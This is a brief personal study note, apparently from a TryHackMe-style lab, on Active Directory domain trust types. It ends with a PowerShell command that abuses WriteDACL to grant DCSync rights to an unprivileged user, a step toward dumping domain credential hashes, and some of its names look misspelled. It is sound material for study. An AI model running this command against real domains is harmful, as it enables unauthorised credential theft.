# Active Directory Domain Exploitation

#### Trust Definitions

For more depth and related information consider reading [[Active-Directory-Defined]].

Domain Trust Typology:
- Inbound - Domain A  is trusted by Domain B (Domain A gains access to resources in B) 
- Outbound - Domain A trust is outbound to another Domain B (Domain B gains access to resources in A) 
- Bidirectional - Both Domains A and B trust one another both gains access to resources in each other 
- [Transitive](https://learn.microsoft.com/en-us/azure/active-directory-domain-services/concepts-forest-trust) - *"Transitivity determines whether a trust can be extended outside of the two domains with which it was formed.
	- *A transitive trust can be used to extend trust relationships with other domains.*
	- *A non-transitive trust can be used to deny trust relationships with other domains.*"



`WriteDACL` to a domain, give DCSync rights to an unprivileged domain user account
```powershell
AddDomainObjectAcl -TargetIdentity "DC=,DC=local" -PrincipleIdentity $user -Rights DCSync
# Deprecate way
Add-DomainObjectAcl -Credential $Cred -TargetIdentity $domain.local -Rights DCSync
```


## References

[THM Room Exploiting AD](https://tryhackme.com/room/exploitingad)
[burmat](https://burmat.gitbook.io/security/hacking/domain-exploitation)